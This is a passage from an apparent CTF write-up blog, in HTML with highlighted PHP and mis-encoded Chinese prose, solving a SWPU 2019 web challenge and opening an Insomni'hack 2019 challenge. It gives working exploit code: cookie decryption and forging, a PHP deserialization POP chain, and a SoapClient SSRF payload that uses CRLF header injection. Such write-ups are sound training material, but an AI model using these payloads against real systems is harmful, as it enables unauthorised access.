&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$h&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$length&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$swpu&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$swpuctf&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$varch&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">$length&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$h&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#111">$swpuctf&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$h&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$varch&lt;/span>&lt;span style="color:#f92672">.=&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">$h&lt;/span>&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#111">$h&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">$length&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#75af00">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$swpu&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#111">})&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$varch&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#111">}))&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">256&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ³¨æ„åˆ°æˆ‘ä»¬è®¿é—®çš„æ—¶å€™cookieä¼šæœ‰ä¸€ä¸ªuserå­—æ®µ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211110212036.png" alt="image-20211211110212036">&lt;/p>
&lt;p>ç”¨ä¸Šé¢é‚£ä¸ªè§£å¯†è„šæœ¬è¿›è¡Œè§£å¯†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#00a8c8">print&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">de_crypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;3J6Roahxag==&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;flag{this_is_false_flag}&amp;#34;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#75715e">// xiaoC:2
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬ä¼ªé€ ä¸€ä¸ª&lt;code>admin:1&lt;/code>é‡æ–°åŠ å¯†å›žåŽ»ï¼Œå¾—åˆ°&lt;code>xZmdm9NxaQ==&lt;/code>ï¼Œç”¨File_readè¯»ä¸€ä¸‹å‰é¢æåˆ°çš„se.phpï¼Œå¥½å®¶ä¼™ï¼Œæžœç„¶ååºåˆ—åŒ–ï¼Œè€Œä¸”æ˜¯ç»“åˆäº†SoapClientå’Œsession&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session.serialize_handler&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;php&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">aa&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mod1&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mod2&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// $cc
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__call&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$name&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$param&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">$name&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$s1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">$name&lt;/span>&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#111">$s1&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#75715e">// $cc-&amp;gt;__invoke
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ke&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mod2&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$ke&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">bb&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mod1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// $aa
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mod2&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mod1&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">test2&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#75715e">// $aa-&amp;gt;__call
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">cc&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mod1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// $ee
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mod2&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mod3&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__invoke&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mod2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mod3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mod1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// $ee-&amp;gt;__toString
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">dd&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$name&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">getflag&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// æ³¨æ„è¿™é‡Œçš„session
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">call_user_func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ee&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$str1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// $dd
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$str2&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// &amp;#39;getflag&amp;#39;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__toString&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str1&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str2&lt;/span>&lt;span style="color:#111">}();&lt;/span> &lt;span style="color:#75715e">// $dd-&amp;gt;getflag
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$bb&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">bb&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$aa&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">aa&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$cc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">cc&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$ee&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">ee&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$bb&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mod1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$aa&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$cc&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">mod1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$ee&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$dd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">dd&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$dd&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;Get_flag&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$dd&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;call_user_func&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$ee&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">str1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$dd&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$ee&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">str2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;getflag&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$aa&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mod2&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;test2&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$cc&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$bb&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>interface.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Service.php&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$ser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">SoapServer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Service.wsdl&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;soap_version&amp;#39;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#75af00">SOAP_1_2&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$ser&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">setClass&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Service&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$ser&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ•´ä½“çš„æ€è·¯å¤§æ¦‚æ˜¯ï¼Œé€šè¿‡æ–‡ä»¶ä¸Šä¼ æŠŠä¸€ä¸ªæˆ‘ä»¬æž„é€ å¥½çš„æ¶æ„SoapClientçš„åºåˆ—åŒ–å­—ç¬¦ä¸²å†™å…¥sess_2333è¿™ä¸ªsessionæ–‡ä»¶ä¸­ï¼Œç„¶åŽåˆ©ç”¨se.phpçš„ååºåˆ—åŒ–åŠŸèƒ½ï¼Œè°ƒç”¨åˆ°&lt;code>call_user_func&lt;/code>çš„æ—¶å€™å°±ä¼šæŠŠsessionä¸­çš„SOAPç±»çš„Get_flagç»™è°ƒç”¨å‡ºæ¥ï¼Œ&lt;code>call_user_func('call_user_func', array($session, 'Get_flag'));&lt;/code>&lt;/p>
&lt;p>â€”â€”â€”â€”â€”â€”ä½†æ˜¯è¿™é‡Œå°±æœ‰ä¸ªé—®é¢˜ï¼Œæ€Žä¹ˆèƒ½ç¡®å®šæˆ‘ä»¬ssrfæ‰“çš„interface.phpå°±æœ‰Get_flagæ–¹æ³•å‘¢ï¼Ÿä¸ºä»€ä¹ˆä¸æ‰“ssrfçš„/index.php?method=get_flagå‘¢ï¼Ÿå‡ºé¢˜äººè¯´é‚£ä¸ªä¸è¾“å‡ºç»“æžœï¼Œå¤šåšäº†ä¸ªsoapæŽ¥å£interface.phpæ¥æ”»å‡»&lt;/p>
&lt;p>é¦–å…ˆæ˜¯è¿™ä¸ªSoapClient&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$target&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://127.0.0.1/interface.php&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#39;X-Forwarded-For: 127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;Cookie: user=xZmdm9NxaQ==&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">SoapClient&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;location&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#111">$target&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;user_agent&amp;#39;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz^^Content-Type: application/x-www-form-urlencoded^^&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;^^&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$headers&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#d88200">&amp;#39;uri&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;amiz&amp;#34;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;^^&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">// O:10:&amp;#34;SoapClient&amp;#34;:5:{s:3:&amp;#34;uri&amp;#34;;s:4:&amp;#34;amiz&amp;#34;;s:8:&amp;#34;location&amp;#34;;s:30:&amp;#34;http://127.0.0.1/interface.php&amp;#34;;s:15:&amp;#34;_stream_context&amp;#34;;i:0;s:11:&amp;#34;_user_agent&amp;#34;;s:108:&amp;#34;amiz
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">Content-Type: application/x-www-form-urlencoded
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">X-Forwarded-For: 127.0.0.1
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">Cookie: user=xZmdm9NxaQ==&amp;#34;;s:13:&amp;#34;_soap_version&amp;#34;;i:1;}
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼ ä¸ŠåŽ»ï¼Œè®°å¾—æ”¹PHPSESSID&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211115104728.png" alt="image-20211211115104728">&lt;/p>
&lt;p>ç„¶åŽåˆ°/se.phpï¼ŒPOSTæ–¹å¼ä¼ å…¥aa=popé“¾ç»“æžœ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211120852627.png" alt="image-20211211120852627">&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://ha1c9on.top/2020/05/19/swpu2019web6/">wp&lt;/a> | &lt;a href="https://www.cnblogs.com/20175211lyz/p/12285279.html">wp2&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[Insomni hack teaser 2019]Phuck2
&lt;/h4>
&lt;/summary>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">stream_wrapper_unregister&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;php&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// ä¸å¤ªæ‡‚ï¼Ÿ
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;hl&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
